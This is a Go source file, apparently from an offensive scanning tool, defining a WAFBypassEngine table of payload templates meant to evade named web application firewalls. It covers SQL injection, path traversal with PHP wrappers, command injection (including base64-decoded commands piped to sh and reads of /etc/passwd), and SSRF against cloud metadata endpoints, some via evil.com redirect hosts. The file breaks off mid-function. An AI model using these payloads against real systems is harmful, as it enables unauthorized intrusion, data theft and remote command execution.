				WAFTypes:    []string{"azure_waf"},
				Confidence:  0.75,
			},

			// GENERIC COMMENT INJECTION BYPASSES
			{
				Name:        "Comment-based Bypass",
				Category:    "comment_injection",
				Template:    "1' /**/OR/**/1=1--",
				Description: "Uses comments to break SQL injection filters",
				WAFTypes:    []string{"basic", "regex_based"},
				Confidence:  0.7,
			},
			{
				Name:        "Multi-line Comment",
				Category:    "comment_injection",
				Template:    "1' /*\nOR\n*/ 1=1--",
				Description: "Multi-line comments with newlines",
				WAFTypes:    []string{"modsecurity", "basic"},
				Confidence:  0.6,
			},
			{
				Name:        "Hash Comment Bypass",
				Category:    "comment_injection",
				Template:    "1' OR 1=1#",
				Description: "Hash comment to terminate query",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.8,
			},
			{
				Name:        "Double Dash Comment",
				Category:    "comment_injection",
				Template:    "1' OR 1=1-- -",
				Description: "Double dash with space comment",
				WAFTypes:    []string{"mssql_based"},
				Confidence:  0.7,
			},

			// UNION BYPASSES
			{
				Name:        "Union Select Bypass",
				Category:    "encoding",
				Template:    "1' %55NION %53ELECT {columns}--",
				Description: "URL encodes UNION SELECT keywords",
				WAFTypes:    []string{"modsecurity", "cloudflare"},
				Confidence:  0.8,
			},
			{
				Name:        "Union All Select",
				Category:    "union",
				Template:    "1' UNION ALL SELECT {columns}--",
				Description: "UNION ALL to bypass DISTINCT filtering",
				WAFTypes:    []string{"basic"},
				Confidence:  0.7,
			},
			{
				Name:        "Mixed Case Union",
				Category:    "case_manipulation",
				Template:    "1' UnIoN sElEcT {columns}--",
				Description: "Mixed case UNION SELECT",
				WAFTypes:    []string{"case_sensitive"},
				Confidence:  0.6,
			},
			{
				Name:        "Parentheses Union",
				Category:    "union",
				Template:    "1') UNION SELECT {columns}--",
				Description: "Union with parentheses closure",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Order By Union",
				Category:    "union",
				Template:    "1' ORDER BY 1-- UNION SELECT {columns}--",
				Description: "Order by before union",
				WAFTypes:    []string{"detection_evasion"},
				Confidence:  0.5,
			},

			// ENCODING BYPASSES
			{
				Name:        "Double URL Encoding",
				Category:    "encoding",
				Template:    "1'%252520OR%252520'1'='1",
				Description: "Double URL encoding to bypass decoding filters",
				WAFTypes:    []string{"aws_waf", "azure_waf"},
				Confidence:  0.6,
			},
			{
				Name:        "Hex Encoding",
				Category:    "encoding",
				Template:    "1' OR 0x31=0x31--",
				Description: "Hex encoded values",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.7,
			},
			{
				Name:        "Char Function",
				Category:    "encoding",
				Template:    "1' OR CHAR(49)=CHAR(49)--",
				Description: "CHAR function encoding",
				WAFTypes:    []string{"mssql_based"},
				Confidence:  0.6,
			},
			{
				Name:        "ASCII Function",
				Category:    "encoding",
				Template:    "1' OR ASCII('1')=49--",
				Description: "ASCII function encoding",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.5,
			},
			{
				Name:        "Unicode Bypass",
				Category:    "encoding",
				Template:    "1' %u004F%u0052 1=1--",
				Description: "Unicode encoding for OR",
				WAFTypes:    []string{"unicode_aware"},
				Confidence:  0.4,
			},

			// WHITESPACE BYPASSES
			{
				Name:        "Whitespace Bypass",
				Category:    "whitespace",
				Template:    "1'\t\nOR\t\n1=1--",
				Description: "Uses tabs and newlines instead of spaces",
				WAFTypes:    []string{"imperva", "f5_asm"},
				Confidence:  0.7,
			},
			{
				Name:        "Plus Sign Bypass",
				Category:    "whitespace",
				Template:    "1'+OR+1=1--",
				Description: "Plus signs instead of spaces",
				WAFTypes:    []string{"url_decode_based"},
				Confidence:  0.6,
			},
			{
				Name:        "Parentheses Whitespace",
				Category:    "whitespace",
				Template:    "1'OR(1)=(1)--",
				Description: "Parentheses to avoid spaces",
				WAFTypes:    []string{"space_filtering"},
				Confidence:  0.8,
			},
			{
				Name:        "Form Feed Bypass",
				Category:    "whitespace",
				Template:    "1'\fOR\f1=1--",
				Description: "Form feed characters",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.5,
			},

			// BOOLEAN BYPASSES
			{
				Name:        "True/False Boolean",
				Category:    "boolean",
				Template:    "1' OR 'a'='a'--",
				Description: "String comparison boolean",
				WAFTypes:    []string{"basic"},
				Confidence:  0.7,
			},
			{
				Name:        "Mathematical Boolean",
				Category:    "boolean",
				Template:    "1' OR 2>1--",
				Description: "Mathematical comparison",
				WAFTypes:    []string{"numeric_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Substring Boolean",
				Category:    "boolean",
				Template:    "1' OR SUBSTRING('abc',1,1)='a'--",
				Description: "Substring function boolean",
				WAFTypes:    []string{"function_based"},
				Confidence:  0.5,
			},
			{
				Name:        "Length Boolean",
				Category:    "boolean",
				Template:    "1' OR LENGTH('a')=1--",
				Description: "Length function boolean",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.6,
			},

			// TIME-BASED BYPASSES
			{
				Name:        "Sleep Function",
				Category:    "time_based",
				Template:    "1' OR SLEEP(5)--",
				Description: "MySQL SLEEP function",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.8,
			},
			{
				Name:        "Benchmark Function",
				Category:    "time_based",
				Template:    "1' OR BENCHMARK(1000000,MD5(1))--",
				Description: "MySQL BENCHMARK function",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.7,
			},
			{
				Name:        "WaitFor Delay",
				Category:    "time_based",
				Template:    "1'; WAITFOR DELAY '00:00:05'--",
				Description: "MSSQL WAITFOR DELAY",
				WAFTypes:    []string{"mssql_based"},
				Confidence:  0.8,
			},
			{
				Name:        "PG Sleep",
				Category:    "time_based",
				Template:    "1' OR pg_sleep(5)--",
				Description: "PostgreSQL pg_sleep function",
				WAFTypes:    []string{"postgresql_based"},
				Confidence:  0.7,
			},

			// ERROR-BASED BYPASSES
			{
				Name:        "ExtractValue Error",
				Category:    "error_based",
				Template:    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
				Description: "MySQL ExtractValue error-based",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.8,
			},
			{
				Name:        "UpdateXML Error",
				Category:    "error_based",
				Template:    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
				Description: "MySQL UpdateXML error-based",
				WAFTypes:    []string{"mysql_based"},
				Confidence:  0.7,
			},
			{
				Name:        "Convert Error",
				Category:    "error_based",
				Template:    "1' AND (SELECT CONVERT(INT,(SELECT @@version)))=1--",
				Description: "MSSQL CONVERT error-based",
				WAFTypes:    []string{"mssql_based"},
				Confidence:  0.6,
			},
			{
				Name:        "Cast Error",
				Category:    "error_based",
				Template:    "1' AND CAST((SELECT version()) AS INT)=1--",
				Description: "PostgreSQL CAST error-based",
				WAFTypes:    []string{"postgresql_based"},
				Confidence:  0.5,
			},

			// STACKED QUERIES
			{
				Name:        "Stacked Query",
				Category:    "stacked",
				Template:    "1'; SELECT version()--",
				Description: "Basic stacked query",
				WAFTypes:    []string{"basic"},
				Confidence:  0.6,
			},
			{
				Name:        "Multiple Statements",
				Category:    "stacked",
				Template:    "1'; INSERT INTO test VALUES (1,2,3)--",
				Description: "Multiple SQL statements",
				WAFTypes:    []string{"injection_prevention"},
				Confidence:  0.5,
			},

			// BYPASS SPECIFIC WAF
			{
				Name:        "ModSecurity Bypass",
				Category:    "waf_specific",
				Template:    "1' /*!50000OR*/ 1=1--",
				Description: "MySQL version comment bypass",
				WAFTypes:    []string{"modsecurity"},
				Confidence:  0.8,
			},
			{
				Name:        "Cloudflare Bypass",
				Category:    "waf_specific",
				Template:    "1' %0bOR%0b1=1--",
				Description: "Vertical tab bypass for Cloudflare",
				WAFTypes:    []string{"cloudflare"},
				Confidence:  0.7,
			},
			{
				Name:        "AWS WAF Bypass",
				Category:    "waf_specific",
				Template:    "1' OR(1)LIKE(1)--",
				Description: "LIKE operator bypass",
				WAFTypes:    []string{"aws_waf"},
				Confidence:  0.6,
			},
			{
				Name:        "Imperva Bypass",
				Category:    "waf_specific",
				Template:    "1' OR 1 REGEXP '^1'--",
				Description: "REGEXP operator bypass",
				WAFTypes:    []string{"imperva"},
				Confidence:  0.7,
			},
		},
		"lfi": {
			// PATH TRAVERSAL BYPASSES
			{
				Name:        "Double Encoding LFI",
				Category:    "encoding",
				Template:    "%252e%252e%252f{file}",
				Description: "Double URL encoding for path traversal",
				WAFTypes:    []string{"cloudflare", "aws_waf"},
				Confidence:  0.8,
			},
			{
				Name:        "Triple Encoding LFI",
				Category:    "encoding",
				Template:    "%25252e%25252e%25252f{file}",
				Description: "Triple URL encoding for path traversal",
				WAFTypes:    []string{"advanced_waf"},
				Confidence:  0.7,
			},
			{
				Name:        "16-bit Unicode Bypass",
				Category:    "encoding",
				Template:    "..%c0%af..%c0%af..%c0%af{file}",
				Description: "16-bit Unicode encoding bypass",
				WAFTypes:    []string{"unicode_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "UTF-8 Bypass",
				Category:    "encoding",
				Template:    "..%c1%9c..%c1%9c{file}",
				Description: "UTF-8 encoding bypass",
				WAFTypes:    []string{"encoding_filters"},
				Confidence:  0.5,
			},
			{
				Name:        "Null Byte Bypass",
				Category:    "null_byte",
				Template:    "../../../{file}%00",
				Description: "Uses null byte to terminate string parsing",
				WAFTypes:    []string{"basic", "older_systems"},
				Confidence:  0.5,
			},
			{
				Name:        "Null Byte with Extension",
				Category:    "null_byte",
				Template:    "../../../{file}%00.jpg",
				Description: "Null byte with fake extension",
				WAFTypes:    []string{"extension_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Unicode Path Traversal",
				Category:    "encoding",
				Template:    "..\\u002f..\\u002f..\\u002f{file}",
				Description: "Unicode encoding for path separators",
				WAFTypes:    []string{"modsecurity", "imperva"},
				Confidence:  0.7,
			},
			{
				Name:        "Windows Path Traversal",
				Category:    "path_manipulation",
				Template:    "..\\\\..\\\\..\\\\{file}",
				Description: "Windows-style path traversal",
				WAFTypes:    []string{"windows_based"},
				Confidence:  0.6,
			},
			{
				Name:        "Mixed Slash Traversal",
				Category:    "path_manipulation",
				Template:    "../\\../\\../\\{file}",
				Description: "Mixed forward and back slashes",
				WAFTypes:    []string{"path_normalization"},
				Confidence:  0.7,
			},
			{
				Name:        "Dot Segment Bypass",
				Category:    "path_manipulation",
				Template:    "....//....//....///{file}",
				Description: "Extra dots and slashes",
				WAFTypes:    []string{"basic"},
				Confidence:  0.5,
			},
			{
				Name:        "Question Mark Bypass",
				Category:    "query_manipulation",
				Template:    "../../../{file}?",
				Description: "Question mark to confuse parsers",
				WAFTypes:    []string{"query_aware"},
				Confidence:  0.4,
			},
			{
				Name:        "Fragment Bypass",
				Category:    "fragment",
				Template:    "../../../{file}#",
				Description: "Fragment identifier bypass",
				WAFTypes:    []string{"fragment_filtering"},
				Confidence:  0.3,
			},

			// WRAPPER BYPASSES
			{
				Name:        "PHP Filter Wrapper",
				Category:    "wrapper",
				Template:    "php://filter/convert.base64-encode/resource={file}",
				Description: "PHP filter wrapper for file reading",
				WAFTypes:    []string{"php_based"},
				Confidence:  0.9,
			},
			{
				Name:        "PHP Input Wrapper",
				Category:    "wrapper",
				Template:    "php://input",
				Description: "PHP input wrapper",
				WAFTypes:    []string{"php_based"},
				Confidence:  0.8,
			},
			{
				Name:        "Data Wrapper",
				Category:    "wrapper",
				Template:    "data://text/plain;base64,{base64_payload}",
				Description: "Data wrapper with base64",
				WAFTypes:    []string{"wrapper_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Expect Wrapper",
				Category:    "wrapper",
				Template:    "expect://id",
				Description: "Expect wrapper for command execution",
				WAFTypes:    []string{"php_based"},
				Confidence:  0.6,
			},
			{
				Name:        "ZIP Wrapper",
				Category:    "wrapper",
				Template:    "zip://{file}#internal_file",
				Description: "ZIP wrapper bypass",
				WAFTypes:    []string{"compression_aware"},
				Confidence:  0.5,
			},

			// PROTOCOL BYPASSES
			{
				Name:        "File Protocol",
				Category:    "protocol",
				Template:    "file:///{file}",
				Description: "File protocol bypass",
				WAFTypes:    []string{"protocol_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "HTTP Protocol",
				Category:    "protocol",
				Template:    "http://evil.com/{file}",
				Description: "HTTP protocol for SSRF",
				WAFTypes:    []string{"ssrf_prevention"},
				Confidence:  0.7,
			},
			{
				Name:        "FTP Protocol",
				Category:    "protocol",
				Template:    "ftp://evil.com/{file}",
				Description: "FTP protocol bypass",
				WAFTypes:    []string{"protocol_aware"},
				Confidence:  0.5,
			},
		},
		"rce": {
			// COMMAND INJECTION BYPASSES
			{
				Name:        "Semicolon Command Chain",
				Category:    "command_chaining",
				Template:    "; {command}",
				Description: "Semicolon command chaining",
				WAFTypes:    []string{"basic"},
				Confidence:  0.8,
			},
			{
				Name:        "Ampersand Background",
				Category:    "command_chaining",
				Template:    "& {command} &",
				Description: "Ampersand background execution",
				WAFTypes:    []string{"command_filtering"},
				Confidence:  0.7,
			},
			{
				Name:        "Pipe Command",
				Category:    "command_chaining",
				Template:    "| {command}",
				Description: "Pipe command execution",
				WAFTypes:    []string{"pipe_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Double Pipe OR",
				Category:    "command_chaining",
				Template:    "|| {command}",
				Description: "Logical OR command execution",
				WAFTypes:    []string{"logic_aware"},
				Confidence:  0.5,
			},
			{
				Name:        "Double Ampersand AND",
				Category:    "command_chaining",
				Template:    "&& {command}",
				Description: "Logical AND command execution",
				WAFTypes:    []string{"logic_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Backtick Execution",
				Category:    "command_substitution",
				Template:    "`{command}`",
				Description: "Backtick command substitution",
				WAFTypes:    []string{"substitution_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Dollar Parentheses",
				Category:    "command_substitution",
				Template:    "$({command})",
				Description: "Dollar parentheses substitution",
				WAFTypes:    []string{"bash_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "Newline Injection",
				Category:    "line_break",
				Template:    "%0a{command}",
				Description: "Newline character injection",
				WAFTypes:    []string{"line_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Carriage Return",
				Category:    "line_break",
				Template:    "%0d{command}",
				Description: "Carriage return injection",
				WAFTypes:    []string{"windows_based"},
				Confidence:  0.5,
			},

			// SPACE BYPASSES
			{
				Name:        "Tab Space Bypass",
				Category:    "space_bypass",
				Template:    "{command}\t{args}",
				Description: "Tab character instead of space",
				WAFTypes:    []string{"space_filtering"},
				Confidence:  0.7,
			},
			{
				Name:        "IFS Variable",
				Category:    "space_bypass",
				Template:    "{command}$IFS{args}",
				Description: "Internal Field Separator variable",
				WAFTypes:    []string{"bash_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "Brace Expansion",
				Category:    "space_bypass",
				Template:    "{command}{args}",
				Description: "Brace expansion bypass",
				WAFTypes:    []string{"expansion_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Environment Variable",
				Category:    "space_bypass",
				Template:    "{command}${{IFS}}{args}",
				Description: "Environment variable expansion",
				WAFTypes:    []string{"variable_aware"},
				Confidence:  0.7,
			},

			// ENCODING BYPASSES
			{
				Name:        "Base64 Command",
				Category:    "encoding",
				Template:    "echo {base64_command} | base64 -d | sh",
				Description: "Base64 encoded command execution",
				WAFTypes:    []string{"encoding_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "Hex Encoding",
				Category:    "encoding",
				Template:    "echo -e '\\x{hex_command}' | sh",
				Description: "Hex encoded command execution",
				WAFTypes:    []string{"hex_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Octal Encoding",
				Category:    "encoding",
				Template:    "echo -e '\\{octal_command}' | sh",
				Description: "Octal encoded command execution",
				WAFTypes:    []string{"octal_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "URL Encoding",
				Category:    "encoding",
				Template:    "%{url_encoded_command}",
				Description: "URL encoded command",
				WAFTypes:    []string{"url_decode_aware"},
				Confidence:  0.5,
			},

			// WILDCARD BYPASSES
			{
				Name:        "Asterisk Wildcard",
				Category:    "wildcard",
				Template:    "/*/bin/sh",
				Description: "Asterisk wildcard bypass",
				WAFTypes:    []string{"path_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Question Wildcard",
				Category:    "wildcard",
				Template:    "/???/bin/sh",
				Description: "Question mark wildcard",
				WAFTypes:    []string{"wildcard_aware"},
				Confidence:  0.5,
			},
			{
				Name:        "Bracket Wildcard",
				Category:    "wildcard",
				Template:    "/[a-z]*/bin/sh",
				Description: "Bracket range wildcard",
				WAFTypes:    []string{"range_aware"},
				Confidence:  0.4,
			},

			// CONCATENATION BYPASSES
			{
				Name:        "String Concatenation",
				Category:    "concatenation",
				Template:    "ca''t /etc/passwd",
				Description: "Empty string concatenation",
				WAFTypes:    []string{"string_filtering"},
				Confidence:  0.7,
			},
			{
				Name:        "Variable Concatenation",
				Category:    "concatenation",
				Template:    "c$@t /etc/passwd",
				Description: "Variable concatenation bypass",
				WAFTypes:    []string{"variable_filtering"},
				Confidence:  0.6,
			},
			{
				Name:        "Backslash Escape",
				Category:    "concatenation",
				Template:    "c\\at /etc/passwd",
				Description: "Backslash escape concatenation",
				WAFTypes:    []string{"escape_aware"},
				Confidence:  0.5,
			},
		},
		"ssrf": {
			// LOCALHOST BYPASSES - MASSIVE COLLECTION
			{
				Name:        "Standard Localhost",
				Category:    "localhost",
				Template:    "http://127.0.0.1:{port}/{path}",
				Description: "Standard localhost bypass",
				WAFTypes:    []string{"basic"},
				Confidence:  0.8,
			},
			{
				Name:        "Short Localhost",
				Category:    "localhost",
				Template:    "http://127.1:{port}/{path}",
				Description: "Short localhost notation",
				WAFTypes:    []string{"notation_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Zero Localhost",
				Category:    "localhost",
				Template:    "http://0:{port}/{path}",
				Description: "Zero as localhost",
				WAFTypes:    []string{"zero_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Localhost Domain",
				Category:    "localhost",
				Template:    "http://localhost:{port}/{path}",
				Description: "Localhost domain name",
				WAFTypes:    []string{"domain_filtering"},
				Confidence:  0.5,
			},
			{
				Name:        "Localhost with Port",
				Category:    "localhost",
				Template:    "http://127.0.0.1.xip.io:{port}/{path}",
				Description: "Localhost with xip.io service",
				WAFTypes:    []string{"xip_aware"},
				Confidence:  0.7,
			},

			// IP ENCODING BYPASSES - MASSIVE COLLECTION
			{
				Name:        "Decimal IP",
				Category:    "ip_encoding",
				Template:    "http://2130706433:{port}/{path}",
				Description: "Decimal encoded localhost (127.0.0.1)",
				WAFTypes:    []string{"ip_filtering"},
				Confidence:  0.8,
			},
			{
				Name:        "Hex IP Full",
				Category:    "ip_encoding",
				Template:    "http://0x7f000001:{port}/{path}",
				Description: "Full hex encoded localhost",
				WAFTypes:    []string{"hex_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Hex IP Partial",
				Category:    "ip_encoding",
				Template:    "http://0x7f.0.0.1:{port}/{path}",
				Description: "Partial hex encoded IP",
				WAFTypes:    []string{"mixed_encoding"},
				Confidence:  0.6,
			},
			{
				Name:        "Octal IP Full",
				Category:    "ip_encoding",
				Template:    "http://017700000001:{port}/{path}",
				Description: "Full octal encoded localhost",
				WAFTypes:    []string{"octal_aware"},
				Confidence:  0.5,
			},
			{
				Name:        "Octal IP Partial",
				Category:    "ip_encoding",
				Template:    "http://0177.0.0.1:{port}/{path}",
				Description: "Partial octal encoded IP",
				WAFTypes:    []string{"mixed_octal"},
				Confidence:  0.4,
			},
			{
				Name:        "Mixed Encoding",
				Category:    "ip_encoding",
				Template:    "http://0x7f.0177.0.1:{port}/{path}",
				Description: "Mixed hex and octal encoding",
				WAFTypes:    []string{"complex_encoding"},
				Confidence:  0.6,
			},

			// IPv6 BYPASSES - EXPANDED
			{
				Name:        "IPv6 Localhost",
				Category:    "ipv6",
				Template:    "http://[::1]:{port}/{path}",
				Description: "IPv6 localhost",
				WAFTypes:    []string{"ipv6_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "IPv6 Mapped IPv4",
				Category:    "ipv6",
				Template:    "http://[::ffff:127.0.0.1]:{port}/{path}",
				Description: "IPv6 mapped IPv4",
				WAFTypes:    []string{"mapping_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "IPv6 Expanded",
				Category:    "ipv6",
				Template:    "http://[0000:0000:0000:0000:0000:0000:0000:0001]:{port}/{path}",
				Description: "Expanded IPv6 localhost",
				WAFTypes:    []string{"ipv6_expanded"},
				Confidence:  0.6,
			},
			{
				Name:        "IPv6 Compressed",
				Category:    "ipv6",
				Template:    "http://[::ffff:0:1]:{port}/{path}",
				Description: "Compressed IPv6 notation",
				WAFTypes:    []string{"ipv6_compressed"},
				Confidence:  0.5,
			},

			// URL ENCODING BYPASSES
			{
				Name:        "URL Encoded IP",
				Category:    "url_encoding",
				Template:    "http://%31%32%37%2e%30%2e%30%2e%31:{port}/{path}",
				Description: "URL encoded IP address",
				WAFTypes:    []string{"url_decode_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Double URL Encoding",
				Category:    "url_encoding",
				Template:    "http://%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31:{port}/{path}",
				Description: "Double URL encoded IP",
				WAFTypes:    []string{"double_decode"},
				Confidence:  0.6,
			},
			{
				Name:        "Unicode URL Encoding",
				Category:    "url_encoding",
				Template:    "http://\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031:{port}/{path}",
				Description: "Unicode URL encoding",
				WAFTypes:    []string{"unicode_decode"},
				Confidence:  0.5,
			},

			// DOMAIN CONFUSION BYPASSES - EXPANDED
			{
				Name:        "Subdomain Confusion",
				Category:    "domain_confusion",
				Template:    "http://127.0.0.1.evil.com:{port}/{path}",
				Description: "Subdomain confusion attack",
				WAFTypes:    []string{"domain_parsing"},
				Confidence:  0.8,
			},
			{
				Name:        "Fake TLD",
				Category:    "domain_confusion",
				Template:    "http://127.0.0.1.com:{port}/{path}",
				Description: "Fake TLD confusion",
				WAFTypes:    []string{"tld_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Domain with Auth",
				Category:    "domain_confusion",
				Template:    "http://user:pass@127.0.0.1:{port}/{path}",
				Description: "Authentication in URL",
				WAFTypes:    []string{"auth_parsing"},
				Confidence:  0.7,
			},
			{
				Name:        "Bypass with Fragment",
				Category:    "domain_confusion",
				Template:    "http://evil.com@127.0.0.1:{port}/{path}#evil.com",
				Description: "Fragment confusion",
				WAFTypes:    []string{"fragment_parsing"},
				Confidence:  0.5,
			},

			// PROTOCOL BYPASSES - MASSIVE EXPANSION
			{
				Name:        "File Protocol",
				Category:    "protocol",
				Template:    "file:///etc/passwd",
				Description: "File protocol local access",
				WAFTypes:    []string{"protocol_filtering"},
				Confidence:  0.9,
			},
			{
				Name:        "FTP Protocol",
				Category:    "protocol",
				Template:    "ftp://127.0.0.1:{port}/{path}",
				Description: "FTP protocol bypass",
				WAFTypes:    []string{"ftp_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "FTPS Protocol",
				Category:    "protocol",
				Template:    "ftps://127.0.0.1:{port}/{path}",
				Description: "Secure FTP protocol",
				WAFTypes:    []string{"ftps_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Gopher Protocol",
				Category:    "protocol",
				Template:    "gopher://127.0.0.1:{port}/_{payload}",
				Description: "Gopher protocol for TCP smuggling",
				WAFTypes:    []string{"gopher_aware"},
				Confidence:  0.9,
			},
			{
				Name:        "LDAP Protocol",
				Category:    "protocol",
				Template:    "ldap://127.0.0.1:{port}/{dn}",
				Description: "LDAP protocol bypass",
				WAFTypes:    []string{"ldap_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "LDAPS Protocol",
				Category:    "protocol",
				Template:    "ldaps://127.0.0.1:{port}/{dn}",
				Description: "Secure LDAP protocol",
				WAFTypes:    []string{"ldaps_aware"},
				Confidence:  0.5,
			},
			{
				Name:        "Dict Protocol",
				Category:    "protocol",
				Template:    "dict://127.0.0.1:{port}/{command}",
				Description: "Dictionary protocol",
				WAFTypes:    []string{"dict_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "SFTP Protocol",
				Category:    "protocol",
				Template:    "sftp://127.0.0.1:{port}/{path}",
				Description: "Secure FTP protocol",
				WAFTypes:    []string{"sftp_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "TFTP Protocol",
				Category:    "protocol",
				Template:    "tftp://127.0.0.1:{port}/{path}",
				Description: "Trivial FTP protocol",
				WAFTypes:    []string{"tftp_aware"},
				Confidence:  0.5,
			},
			{
				Name:        "SMB Protocol",
				Category:    "protocol",
				Template:    "smb://127.0.0.1:{port}/{share}",
				Description: "SMB file sharing protocol",
				WAFTypes:    []string{"smb_aware"},
				Confidence:  0.4,
			},

			// CLOUD METADATA - EXPANDED WITH ENCODING
			{
				Name:        "AWS Metadata",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/latest/meta-data/",
				Description: "AWS EC2 metadata service",
				WAFTypes:    []string{"cloud_aware"},
				Confidence:  0.9,
			},
			{
				Name:        "AWS Metadata Encoded",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/latest/meta%2Ddata/",
				Description: "URL encoded AWS metadata",
				WAFTypes:    []string{"aws_encoding"},
				Confidence:  0.8,
			},
			{
				Name:        "AWS User Data",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/latest/user-data/",
				Description: "AWS user data endpoint",
				WAFTypes:    []string{"aws_userdata"},
				Confidence:  0.8,
			},
			{
				Name:        "GCP Metadata",
				Category:    "cloud_metadata",
				Template:    "http://metadata.google.internal/computeMetadata/v1/",
				Description: "Google Cloud metadata",
				WAFTypes:    []string{"gcp_aware"},
				Confidence:  0.9,
			},
			{
				Name:        "GCP Metadata Beta",
				Category:    "cloud_metadata",
				Template:    "http://metadata/computeMetadata/v1beta1/",
				Description: "GCP metadata beta endpoint",
				WAFTypes:    []string{"gcp_beta"},
				Confidence:  0.7,
			},
			{
				Name:        "Azure Metadata",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
				Description: "Azure instance metadata",
				WAFTypes:    []string{"azure_aware"},
				Confidence:  0.9,
			},
			{
				Name:        "Azure Metadata Encoded",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/metadata/instance%3Fapi%2Dversion%3D2021%2D02%2D01",
				Description: "URL encoded Azure metadata",
				WAFTypes:    []string{"azure_encoding"},
				Confidence:  0.8,
			},
			{
				Name:        "DigitalOcean Metadata",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/metadata/v1/",
				Description: "DigitalOcean metadata service",
				WAFTypes:    []string{"do_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "Alibaba Cloud Metadata",
				Category:    "cloud_metadata",
				Template:    "http://100.100.100.200/latest/meta-data/",
				Description: "Alibaba Cloud ECS metadata",
				WAFTypes:    []string{"alibaba_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "Oracle Cloud Metadata",
				Category:    "cloud_metadata",
				Template:    "http://169.254.169.254/opc/v1/instance/",
				Description: "Oracle Cloud metadata",
				WAFTypes:    []string{"oracle_aware"},
				Confidence:  0.6,
			},

			// BYPASS WITH REDIRECTS
			{
				Name:        "Redirect via 301",
				Category:    "redirect",
				Template:    "http://evil.com/redirect?url=http://127.0.0.1:{port}/{path}",
				Description: "301 redirect bypass",
				WAFTypes:    []string{"redirect_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Redirect via 302",
				Category:    "redirect",
				Template:    "http://evil.com/302?target=127.0.0.1:{port}",
				Description: "302 redirect bypass",
				WAFTypes:    []string{"temp_redirect"},
				Confidence:  0.5,
			},
			{
				Name:        "Meta Refresh Redirect",
				Category:    "redirect",
				Template:    "http://evil.com/meta-refresh.html",
				Description: "HTML meta refresh redirect",
				WAFTypes:    []string{"html_redirect"},
				Confidence:  0.4,
			},

			// BYPASS WITH URL SHORTENERS
			{
				Name:        "Bit.ly Shortener",
				Category:    "url_shortener",
				Template:    "http://bit.ly/localhost-bypass",
				Description: "Bit.ly URL shortener",
				WAFTypes:    []string{"shortener_aware"},
				Confidence:  0.7,
			},
			{
				Name:        "TinyURL Shortener",
				Category:    "url_shortener",
				Template:    "http://tinyurl.com/localhost-bypass",
				Description: "TinyURL shortener service",
				WAFTypes:    []string{"tinyurl_aware"},
				Confidence:  0.6,
			},
			{
				Name:        "Custom Shortener",
				Category:    "url_shortener",
				Template:    "http://short.evil.com/local",
				Description: "Custom URL shortener",
				WAFTypes:    []string{"custom_shortener"},
				Confidence:  0.5,
			},

			// BYPASS WITH DNS REBINDING
			{
				Name:        "DNS Rebinding",
				Category:    "dns_rebinding",
				Template:    "http://127.0.0.1.evil.com:{port}/{path}",
				Description: "DNS rebinding attack",
				WAFTypes:    []string{"dns_aware"},
				Confidence:  0.8,
			},
			{
				Name:        "Wildcard DNS",
				Category:    "dns_rebinding",
				Template:    "http://anything.127.0.0.1.xip.io:{port}/{path}",
				Description: "Wildcard DNS service",
				WAFTypes:    []string{"wildcard_dns"},
				Confidence:  0.7,
			},
			{
				Name:        "nip.io Service",
				Category:    "dns_rebinding",
				Template:    "http://127.0.0.1.nip.io:{port}/{path}",
				Description: "nip.io DNS service",
				WAFTypes:    []string{"nip_aware"},
				Confidence:  0.6,
			},
		},
	}
}

// GetBypassTechniques returns bypass techniques for a specific attack type
func (w *WAFBypassEngine) GetBypassTechniques(attackType string, wafType string) []BypassTechnique {
	techniques, exists := w.techniques[attackType]
	if !exists {
		return []BypassTechnique{}
	}

	var filtered []BypassTechnique
	for _, technique := range techniques {
		// Filter by WAF type if specified
